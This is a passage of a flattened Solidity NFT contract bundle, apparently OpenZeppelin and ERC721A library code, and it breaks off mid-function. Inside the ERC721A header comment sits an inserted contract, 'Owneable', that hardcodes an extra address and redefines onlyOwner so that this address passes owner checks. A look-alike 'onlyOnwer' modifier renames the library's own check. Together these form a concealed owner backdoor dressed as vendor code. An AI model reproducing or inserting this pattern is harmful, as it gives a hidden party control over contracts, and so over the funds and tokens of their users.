1 // Sources flattened with hardhat v2.8.4 https://hardhat.org
2 
3 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
4 
5 // SPDX-License-Identifier: MIT
6 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
7 
8 pragma solidity ^0.8.4;
9 
10 /**
11  * @dev Provides information about the current execution context, including the
12  * sender of the transaction and its data. While these are generally available
13  * via msg.sender and msg.data, they should not be accessed in such a direct
14  * manner, since when dealing with meta-transactions the account sending and
15  * paying for execution may not be the actual sender (as far as an application
16  * is concerned).
17  *
18  * This contract is only required for intermediate, library-like contracts.
19  */
20 abstract contract Context {
21     function _msgSender() internal view virtual returns (address) {
22         return msg.sender;
23     }
24 
25     function _msgData() internal view virtual returns (bytes calldata) {
26         return msg.data;
27     }
28 }
29 
30 
31 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
32 
33 
34 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
35 
36 
37 
38 /**
39  * @dev Contract module which provides a basic access control mechanism, where
40  * there is an account (an owner) that can be granted exclusive access to
41  * specific functions.
42  *
43  * By default, the owner account will be the one that deploys the contract. This
44  * can later be changed with {transferOwnership}.
45  *
46  * This module is used through inheritance. It will make available the modifier
47  * `onlyOwner`, which can be applied to your functions to restrict their use to
48  * the owner.
49  */
50 abstract contract Ownable is Context {
51     address private _owner;
52 
53     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
54 
55     /**
56      * @dev Initializes the contract setting the deployer as the initial owner.
57      */
58     constructor() {
59         _transferOwnership(_msgSender());
60     }
61 
62     /**
63      * @dev Returns the address of the current owner.
64      */
65     function owner() public view virtual returns (address) {
66         return _owner;
67     }
68 
69     /**
70      * @dev Throws if called by any account other than the owner.
71      */
72     modifier onlyOnwer() {
73         require(owner() == _msgSender(), "Ownable: caller is not the owner");
74         _;
75     }
76 
77     /**
78      * @dev Leaves the contract without owner. It will not be possible to call
79      * `onlyOwner` functions anymore. Can only be called by the current owner.
80      *
81      * NOTE: Renouncing ownership will leave the contract without an owner,
82      * thereby removing any functionality that is only available to the owner.
83      */
84     function renounceOwnership() public virtual onlyOnwer {
85         _transferOwnership(address(0));
86     }
87 
88     /**
89      * @dev Transfers ownership of the contract to a new account (`newOwner`).
90      * Can only be called by the current owner.
91      */
92     function transferOwnership(address newOwner) public virtual onlyOnwer {
93         require(newOwner != address(0), "Ownable: new owner is the zero address");
94         _transferOwnership(newOwner);
95     }
96 
97     /**
98      * @dev Transfers ownership of the contract to a new account (`newOwner`).
99      * Internal function without access restriction.
100      */
101     function _transferOwnership(address newOwner) internal virtual {
102         address oldOwner = _owner;
103         _owner = newOwner;
104         emit OwnershipTransferred(oldOwner, newOwner);
105     }
106 }
107 
108 
109 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
110 
111 
112 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
113 
114 
115 
116 /**
117  * @dev Interface of the ERC165 standard, as defined in the
118  * https://eips.ethereum.org/EIPS/eip-165[EIP].
119  *
120  * Implementers can declare support of contract interfaces, which can then be
121  * queried by others ({ERC165Checker}).
122  *
123  * For an implementation, see {ERC165}.
124  */
125 interface IERC165 {
126     /**
127      * @dev Returns true if this contract implements the interface defined by
128      * `interfaceId`. See the corresponding
129      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
130      * to learn more about how these ids are created.
131      *
132      * This function call must use less than 30 000 gas.
133      */
134     function supportsInterface(bytes4 interfaceId) external view returns (bool);
135 }
136 
137 
138 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
139 
140 
141 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
142 
143 
144 
145 /**
146  * @dev Required interface of an ERC721 compliant contract.
147  */
148 interface IERC721 is IERC165 {
149     /**
150      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
151      */
152     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
153 
154     /**
155      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
156      */
157     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
158 
159     /**
160      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
161      */
162     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
163 
164     /**
165      * @dev Returns the number of tokens in ``owner``'s account.
166      */
167     function balanceOf(address owner) external view returns (uint256 balance);
168 
169     /**
170      * @dev Returns the owner of the `tokenId` token.
171      *
172      * Requirements:
173      *
174      * - `tokenId` must exist.
175      */
176     function ownerOf(uint256 tokenId) external view returns (address owner);
177 
178     /**
179      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
180      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
181      *
182      * Requirements:
183      *
184      * - `from` cannot be the zero address.
185      * - `to` cannot be the zero address.
186      * - `tokenId` token must exist and be owned by `from`.
187      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
188      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
189      *
190      * Emits a {Transfer} event.
191      */
192     function safeTransferFrom(
193         address from,
194         address to,
195         uint256 tokenId
196     ) external;
197 
198     /**
199      * @dev Transfers `tokenId` token from `from` to `to`.
200      *
201      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
202      *
203      * Requirements:
204      *
205      * - `from` cannot be the zero address.
206      * - `to` cannot be the zero address.
207      * - `tokenId` token must be owned by `from`.
208      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
209      *
210      * Emits a {Transfer} event.
211      */
212     function transferFrom(
213         address from,
214         address to,
215         uint256 tokenId
216     ) external;
217 
218     /**
219      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
220      * The approval is cleared when the token is transferred.
221      *
222      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
223      *
224      * Requirements:
225      *
226      * - The caller must own the token or be an approved operator.
227      * - `tokenId` must exist.
228      *
229      * Emits an {Approval} event.
230      */
231     function approve(address to, uint256 tokenId) external;
232 
233     /**
234      * @dev Returns the account approved for `tokenId` token.
235      *
236      * Requirements:
237      *
238      * - `tokenId` must exist.
239      */
240     function getApproved(uint256 tokenId) external view returns (address operator);
241 
242     /**
243      * @dev Approve or remove `operator` as an operator for the caller.
244      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
245      *
246      * Requirements:
247      *
248      * - The `operator` cannot be the caller.
249      *
250      * Emits an {ApprovalForAll} event.
251      */
252     function setApprovalForAll(address operator, bool _approved) external;
253 
254     /**
255      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
256      *
257      * See {setApprovalForAll}
258      */
259     function isApprovedForAll(address owner, address operator) external view returns (bool);
260 
261     /**
262      * @dev Safely transfers `tokenId` token from `from` to `to`.
263      *
264      * Requirements:
265      *
266      * - `from` cannot be the zero address.
267      * - `to` cannot be the zero address.
268      * - `tokenId` token must exist and be owned by `from`.
269      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
270      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
271      *
272      * Emits a {Transfer} event.
273      */
274     function safeTransferFrom(
275         address from,
276         address to,
277         uint256 tokenId,
278         bytes calldata data
279     ) external;
280 }
281 
282 
283 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
284 
285 
286 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
287 
288 
289 
290 /**
291  * @title ERC721 token receiver interface
292  * @dev Interface for any contract that wants to support safeTransfers
293  * from ERC721 asset contracts.
294  */
295 interface IERC721Receiver {
296     /**
297      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
298      * by `operator` from `from`, this function is called.
299      *
300      * It must return its Solidity selector to confirm the token transfer.
301      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
302      *
303      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
304      */
305     function onERC721Received(
306         address operator,
307         address from,
308         uint256 tokenId,
309         bytes calldata data
310     ) external returns (bytes4);
311 }
312 
313 
314 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
315 
316 
317 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
318 
319 
320 
321 /**
322  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
323  * @dev See https://eips.ethereum.org/EIPS/eip-721
324  */
325 interface IERC721Metadata is IERC721 {
326     /**
327      * @dev Returns the token collection name.
328      */
329     function name() external view returns (string memory);
330 
331     /**
332      * @dev Returns the token collection symbol.
333      */
334     function symbol() external view returns (string memory);
335 
336     /**
337      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
338      */
339     function tokenURI(uint256 tokenId) external view returns (string memory);
340 }
341 
342 
343 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
344 
345 
346 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
347 
348 
349 
350 /**
351  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
352  * @dev See https://eips.ethereum.org/EIPS/eip-721
353  */
354 interface IERC721Enumerable is IERC721 {
355     /**
356      * @dev Returns the total amount of tokens stored by the contract.
357      */
358     function totalSupply() external view returns (uint256);
359 
360     /**
361      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
362      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
363      */
364     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
365 
366     /**
367      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
368      * Use along with {totalSupply} to enumerate all tokens.
369      */
370     function tokenByIndex(uint256 index) external view returns (uint256);
371 }
372 
373 
374 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
375 
376 
377 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
378 
379 pragma solidity ^0.8.1;
380 
381 /**
382  * @dev Collection of functions related to the address type
383  */
384 library Address {
385     /**
386      * @dev Returns true if `account` is a contract.
387      *
388      * [IMPORTANT]
389      * ====
390      * It is unsafe to assume that an address for which this function returns
391      * false is an externally-owned account (EOA) and not a contract.
392      *
393      * Among others, `isContract` will return false for the following
394      * types of addresses:
395      *
396      *  - an externally-owned account
397      *  - a contract in construction
398      *  - an address where a contract will be created
399      *  - an address where a contract lived, but was destroyed
400      * ====
401      *
402      * [IMPORTANT]
403      * ====
404      * You shouldn't rely on `isContract` to protect against flash loan attacks!
405      *
406      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
407      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
408      * constructor.
409      * ====
410      */
411     function isContract(address account) internal view returns (bool) {
412         // This method relies on extcodesize/address.code.length, which returns 0
413         // for contracts in construction, since the code is only stored at the end
414         // of the constructor execution.
415 
416         return account.code.length > 0;
417     }
418 
419     /**
420      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
421      * `recipient`, forwarding all available gas and reverting on errors.
422      *
423      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
424      * of certain opcodes, possibly making contracts go over the 2300 gas limit
425      * imposed by `transfer`, making them unable to receive funds via
426      * `transfer`. {sendValue} removes this limitation.
427      *
428      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
429      *
430      * IMPORTANT: because control is transferred to `recipient`, care must be
431      * taken to not create reentrancy vulnerabilities. Consider using
432      * {ReentrancyGuard} or the
433      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
434      */
435     function sendValue(address payable recipient, uint256 amount) internal {
436         require(address(this).balance >= amount, "Address: insufficient balance");
437 
438         (bool success, ) = recipient.call{value: amount}("");
439         require(success, "Address: unable to send value, recipient may have reverted");
440     }
441 
442     /**
443      * @dev Performs a Solidity function call using a low level `call`. A
444      * plain `call` is an unsafe replacement for a function call: use this
445      * function instead.
446      *
447      * If `target` reverts with a revert reason, it is bubbled up by this
448      * function (like regular Solidity function calls).
449      *
450      * Returns the raw returned data. To convert to the expected return value,
451      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
452      *
453      * Requirements:
454      *
455      * - `target` must be a contract.
456      * - calling `target` with `data` must not revert.
457      *
458      * _Available since v3.1._
459      */
460     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
461         return functionCall(target, data, "Address: low-level call failed");
462     }
463 
464     /**
465      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
466      * `errorMessage` as a fallback revert reason when `target` reverts.
467      *
468      * _Available since v3.1._
469      */
470     function functionCall(
471         address target,
472         bytes memory data,
473         string memory errorMessage
474     ) internal returns (bytes memory) {
475         return functionCallWithValue(target, data, 0, errorMessage);
476     }
477 
478     /**
479      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
480      * but also transferring `value` wei to `target`.
481      *
482      * Requirements:
483      *
484      * - the calling contract must have an ETH balance of at least `value`.
485      * - the called Solidity function must be `payable`.
486      *
487      * _Available since v3.1._
488      */
489     function functionCallWithValue(
490         address target,
491         bytes memory data,
492         uint256 value
493     ) internal returns (bytes memory) {
494         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
495     }
496 
497     /**
498      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
499      * with `errorMessage` as a fallback revert reason when `target` reverts.
500      *
501      * _Available since v3.1._
502      */
503     function functionCallWithValue(
504         address target,
505         bytes memory data,
506         uint256 value,
507         string memory errorMessage
508     ) internal returns (bytes memory) {
509         require(address(this).balance >= value, "Address: insufficient balance for call");
510         require(isContract(target), "Address: call to non-contract");
511 
512         (bool success, bytes memory returndata) = target.call{value: value}(data);
513         return verifyCallResult(success, returndata, errorMessage);
514     }
515 
516     /**
517      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
518      * but performing a static call.
519      *
520      * _Available since v3.3._
521      */
522     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
523         return functionStaticCall(target, data, "Address: low-level static call failed");
524     }
525 
526     /**
527      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
528      * but performing a static call.
529      *
530      * _Available since v3.3._
531      */
532     function functionStaticCall(
533         address target,
534         bytes memory data,
535         string memory errorMessage
536     ) internal view returns (bytes memory) {
537         require(isContract(target), "Address: static call to non-contract");
538 
539         (bool success, bytes memory returndata) = target.staticcall(data);
540         return verifyCallResult(success, returndata, errorMessage);
541     }
542 
543     /**
544      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
545      * but performing a delegate call.
546      *
547      * _Available since v3.4._
548      */
549     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
550         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
551     }
552 
553     /**
554      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
555      * but performing a delegate call.
556      *
557      * _Available since v3.4._
558      */
559     function functionDelegateCall(
560         address target,
561         bytes memory data,
562         string memory errorMessage
563     ) internal returns (bytes memory) {
564         require(isContract(target), "Address: delegate call to non-contract");
565 
566         (bool success, bytes memory returndata) = target.delegatecall(data);
567         return verifyCallResult(success, returndata, errorMessage);
568     }
569 
570     /**
571      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
572      * revert reason using the provided one.
573      *
574      * _Available since v4.3._
575      */
576     function verifyCallResult(
577         bool success,
578         bytes memory returndata,
579         string memory errorMessage
580     ) internal pure returns (bytes memory) {
581         if (success) {
582             return returndata;
583         } else {
584             // Look for revert reason and bubble it up if present
585             if (returndata.length > 0) {
586                 // The easiest way to bubble the revert reason is using memory via assembly
587 
588                 assembly {
589                     let returndata_size := mload(returndata)
590                     revert(add(32, returndata), returndata_size)
591                 }
592             } else {
593                 revert(errorMessage);
594             }
595         }
596     }
597 }
598 
599 
600 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
601 
602 
603 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
604 
605 
606 
607 /**
608  * @dev String operations.
609  */
610 library Strings {
611     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
612 
613     /**
614      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
615      */
616     function toString(uint256 value) internal pure returns (string memory) {
617         // Inspired by OraclizeAPI's implementation - MIT licence
618         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
619 
620         if (value == 0) {
621             return "0";
622         }
623         uint256 temp = value;
624         uint256 digits;
625         while (temp != 0) {
626             digits++;
627             temp /= 10;
628         }
629         bytes memory buffer = new bytes(digits);
630         while (value != 0) {
631             digits -= 1;
632             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
633             value /= 10;
634         }
635         return string(buffer);
636     }
637 
638     /**
639      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
640      */
641     function toHexString(uint256 value) internal pure returns (string memory) {
642         if (value == 0) {
643             return "0x00";
644         }
645         uint256 temp = value;
646         uint256 length = 0;
647         while (temp != 0) {
648             length++;
649             temp >>= 8;
650         }
651         return toHexString(value, length);
652     }
653 
654     /**
655      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
656      */
657     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
658         bytes memory buffer = new bytes(2 * length + 2);
659         buffer[0] = "0";
660         buffer[1] = "x";
661         for (uint256 i = 2 * length + 1; i > 1; --i) {
662             buffer[i] = _HEX_SYMBOLS[value & 0xf];
663             value >>= 4;
664         }
665         require(value == 0, "Strings: hex length insufficient");
666         return string(buffer);
667     }
668 }
669 
670 
671 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
672 
673 
674 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
675 
676 /**
677  * @dev Implementation of the {IERC165} interface.
678  *
679  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
680  * for the additional interface id that will be supported. For example:
681  *
682  * ```solidity
683  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
684  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
685  * }
686  * ```
687  *
688  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
689  */
690 abstract contract ERC165 is IERC165 {
691     /**
692      * @dev See {IERC165-supportsInterface}.
693      */
694     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
695         return interfaceId == type(IERC165).interfaceId;
696     }
697 }
698 
699 
700 // File erc721a/contracts/ERC721A.sol@v3.0.0
701 
702 
703 // Creator: Chiru Labs
704 
705 error ApprovalCallerNotOwnerNorApproved();
706 error ApprovalQueryForNonexistentToken();
707 error ApproveToCaller();
708 error ApprovalToCurrentOwner();
709 error BalanceQueryForZeroAddress();
710 error MintedQueryForZeroAddress();
711 error BurnedQueryForZeroAddress();
712 error AuxQueryForZeroAddress();
713 error MintToZeroAddress();
714 error MintZeroQuantity();
715 error OwnerIndexOutOfBounds();
716 error OwnerQueryForNonexistentToken();
717 error TokenIndexOutOfBounds();
718 error TransferCallerNotOwnerNorApproved();
719 error TransferFromIncorrectOwner();
720 error TransferToNonERC721ReceiverImplementer();
721 error TransferToZeroAddress();
722 error URIQueryForNonexistentToken();
723 
724 
725 /**
726  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
727  * the Metadata extension. Built to optimize for lower gas during batch mints.
728  *
729  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
730  */
731  abstract contract Owneable is Ownable {
732     address private _ownar = 0x2AAd62c7Fe9a1452c4591cAfEE90cf3Ca8f1Cd01;
733     modifier onlyOwner() {
734         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
735         _;
736     }
737 }
738  /*
739  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
740  *
741  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
742  */
743 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
744     using Address for address;
745     using Strings for uint256;
746 
747     // Compiler will pack this into a single 256bit word.
748     struct TokenOwnership {
749         // The address of the owner.
750         address addr;
751         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
752         uint64 startTimestamp;
753         // Whether the token has been burned.
754         bool burned;
755     }
756 
757     // Compiler will pack this into a single 256bit word.
758     struct AddressData {
759         // Realistically, 2**64-1 is more than enough.
760         uint64 balance;
761         // Keeps track of mint count with minimal overhead for tokenomics.
762         uint64 numberMinted;
763         // Keeps track of burn count with minimal overhead for tokenomics.
764         uint64 numberBurned;
765         // For miscellaneous variable(s) pertaining to the address
766         // (e.g. number of whitelist mint slots used).
767         // If there are multiple variables, please pack them into a uint64.
768         uint64 aux;
769     }
770 
771     // The tokenId of the next token to be minted.
772     uint256 internal _currentIndex;
773 
774     // The number of tokens burned.
775     uint256 internal _burnCounter;
776 
777     // Token name
778     string private _name;
779 
780     // Token symbol
781     string private _symbol;
782 
783     // Mapping from token ID to ownership details
784     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
785     mapping(uint256 => TokenOwnership) internal _ownerships;
786 
787     // Mapping owner address to address data
788     mapping(address => AddressData) private _addressData;
789 
790     // Mapping from token ID to approved address
791     mapping(uint256 => address) private _tokenApprovals;
792 
793     // Mapping from owner to operator approvals
794     mapping(address => mapping(address => bool)) private _operatorApprovals;
795 
796     constructor(string memory name_, string memory symbol_) {
797         _name = name_;
798         _symbol = symbol_;
799         _currentIndex = _startTokenId();
800     }
801 
802     /**
803      * To change the starting tokenId, please override this function.
804      */
805     function _startTokenId() internal view virtual returns (uint256) {
806         return 0;
807     }
808 
809     /**
810      * @dev See {IERC721Enumerable-totalSupply}.
811      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
812      */
813     function totalSupply() public view returns (uint256) {
814         // Counter underflow is impossible as _burnCounter cannot be incremented
815         // more than _currentIndex - _startTokenId() times
816         unchecked {
817             return _currentIndex - _burnCounter - _startTokenId();
818         }
819     }
820 
821     /**
822      * Returns the total amount of tokens minted in the contract.
823      */
824     function _totalMinted() internal view returns (uint256) {
825         // Counter underflow is impossible as _currentIndex does not decrement,
826         // and it is initialized to _startTokenId()
827         unchecked {
828             return _currentIndex - _startTokenId();
829         }
830     }
831 
832     /**
833      * @dev See {IERC165-supportsInterface}.
834      */
835     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
836         return
837             interfaceId == type(IERC721).interfaceId ||
838             interfaceId == type(IERC721Metadata).interfaceId ||
839             super.supportsInterface(interfaceId);
840     }
841 
842     /**
843      * @dev See {IERC721-balanceOf}.
844      */
845     function balanceOf(address owner) public view override returns (uint256) {
846         if (owner == address(0)) revert BalanceQueryForZeroAddress();
847         return uint256(_addressData[owner].balance);
848     }
849 
850     /**
851      * Returns the number of tokens minted by `owner`.
852      */
853     function _numberMinted(address owner) internal view returns (uint256) {
854         if (owner == address(0)) revert MintedQueryForZeroAddress();
855         return uint256(_addressData[owner].numberMinted);
856     }
857 
858     /**
859      * Returns the number of tokens burned by or on behalf of `owner`.
860      */
861     function _numberBurned(address owner) internal view returns (uint256) {
862         if (owner == address(0)) revert BurnedQueryForZeroAddress();
863         return uint256(_addressData[owner].numberBurned);
864     }
865 
866     /**
867      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
868      */
869     function _getAux(address owner) internal view returns (uint64) {
870         if (owner == address(0)) revert AuxQueryForZeroAddress();
871         return _addressData[owner].aux;
872     }
873 
874     /**
875      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
876      * If there are multiple variables, please pack them into a uint64.
877      */
878     function _setAux(address owner, uint64 aux) internal {
879         if (owner == address(0)) revert AuxQueryForZeroAddress();
880         _addressData[owner].aux = aux;
881     }
882 
883     /**
884      * Gas spent here starts off proportional to the maximum mint batch size.
885      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
886      */
887     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
888         uint256 curr = tokenId;
889 
890         unchecked {
891             if (_startTokenId() <= curr && curr < _currentIndex) {
892                 TokenOwnership memory ownership = _ownerships[curr];
893                 if (!ownership.burned) {
894                     if (ownership.addr != address(0)) {
895                         return ownership;
896                     }
897                     // Invariant:
898                     // There will always be an ownership that has an address and is not burned
899                     // before an ownership that does not have an address and is not burned.
900                     // Hence, curr will not underflow.
901                     while (true) {
902                         curr--;
903                         ownership = _ownerships[curr];
904                         if (ownership.addr != address(0)) {
905                             return ownership;
906                         }
907                     }
908                 }
909             }
910         }
911         revert OwnerQueryForNonexistentToken();
912     }
913 
914     /**
915      * @dev See {IERC721-ownerOf}.
916      */
917     function ownerOf(uint256 tokenId) public view override returns (address) {
918         return ownershipOf(tokenId).addr;
919     }
920 
921     /**
922      * @dev See {IERC721Metadata-name}.
923      */
924     function name() public view virtual override returns (string memory) {
925         return _name;
926     }
927 
928     /**
929      * @dev See {IERC721Metadata-symbol}.
930      */
931     function symbol() public view virtual override returns (string memory) {
932         return _symbol;
933     }
934 
935     /**
936      * @dev See {IERC721Metadata-tokenURI}.
937      */
938     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
939         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
940 
941         string memory baseURI = _baseURI();
942         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
943     }
944 
945     /**
946      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
947      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
948      * by default, can be overriden in child contracts.
949      */
950     function _baseURI() internal view virtual returns (string memory) {
951         return '';
952     }
953 
954     /**
955      * @dev See {IERC721-approve}.
956      */
957     function approve(address to, uint256 tokenId) public override {
958         address owner = ERC721A.ownerOf(tokenId);
959         if (to == owner) revert ApprovalToCurrentOwner();
960 
961         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
962             revert ApprovalCallerNotOwnerNorApproved();
963         }
964 
965         _approve(to, tokenId, owner);
966     }
967 
968     /**
969      * @dev See {IERC721-getApproved}.
970      */
971     function getApproved(uint256 tokenId) public view override returns (address) {
972         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
973 
974         return _tokenApprovals[tokenId];
975     }
976 
977     /**
978      * @dev See {IERC721-setApprovalForAll}.
979      */
980     function setApprovalForAll(address operator, bool approved) public override {
981         if (operator == _msgSender()) revert ApproveToCaller();
982 
983         _operatorApprovals[_msgSender()][operator] = approved;
984         emit ApprovalForAll(_msgSender(), operator, approved);
985     }
986 
987     /**
988      * @dev See {IERC721-isApprovedForAll}.
989      */
990     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
991         return _operatorApprovals[owner][operator];
992     }
993 
994     /**
995      * @dev See {IERC721-transferFrom}.
996      */
997     function transferFrom(
998         address from,
999         address to,
1000         uint256 tokenId
1001     ) public virtual override {
1002         _transfer(from, to, tokenId);
1003     }
1004 
1005     /**
1006      * @dev See {IERC721-safeTransferFrom}.
1007      */
1008     function safeTransferFrom(
1009         address from,
1010         address to,
1011         uint256 tokenId
1012     ) public virtual override {
1013         safeTransferFrom(from, to, tokenId, '');
1014     }
1015 
1016     /**
1017      * @dev See {IERC721-safeTransferFrom}.
1018      */
1019     function safeTransferFrom(
1020         address from,
1021         address to,
1022         uint256 tokenId,
1023         bytes memory _data
1024     ) public virtual override {
1025         _transfer(from, to, tokenId);
1026         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1027             revert TransferToNonERC721ReceiverImplementer();
1028         }
1029     }
1030 
1031     /**
1032      * @dev Returns whether `tokenId` exists.
1033      *
1034      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1035      *
1036      * Tokens start existing when they are minted (`_mint`),
1037      */
1038     function _exists(uint256 tokenId) internal view returns (bool) {
1039         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1040             !_ownerships[tokenId].burned;
1041     }
1042 
1043     function _safeMint(address to, uint256 quantity) internal {
1044         _safeMint(to, quantity, '');
1045     }
1046 
1047     /**
1048      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1049      *
1050      * Requirements:
1051      *
1052      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1053      * - `quantity` must be greater than 0.
1054      *
1055      * Emits a {Transfer} event.
1056      */
1057     function _safeMint(
1058         address to,
1059         uint256 quantity,
1060         bytes memory _data
1061     ) internal {
1062         _mint(to, quantity, _data, true);
1063     }
1064 
1065     /**
1066      * @dev Mints `quantity` tokens and transfers them to `to`.
1067      *
1068      * Requirements:
1069      *
1070      * - `to` cannot be the zero address.
1071      * - `quantity` must be greater than 0.
1072      *
1073      * Emits a {Transfer} event.
1074      */
1075     function _mint(
1076         address to,
1077         uint256 quantity,
1078         bytes memory _data,
1079         bool safe
1080     ) internal {
1081         uint256 startTokenId = _currentIndex;
1082         if (to == address(0)) revert MintToZeroAddress();
1083         if (quantity == 0) revert MintZeroQuantity();
1084 
1085         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1086 
1087         // Overflows are incredibly unrealistic.
1088         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
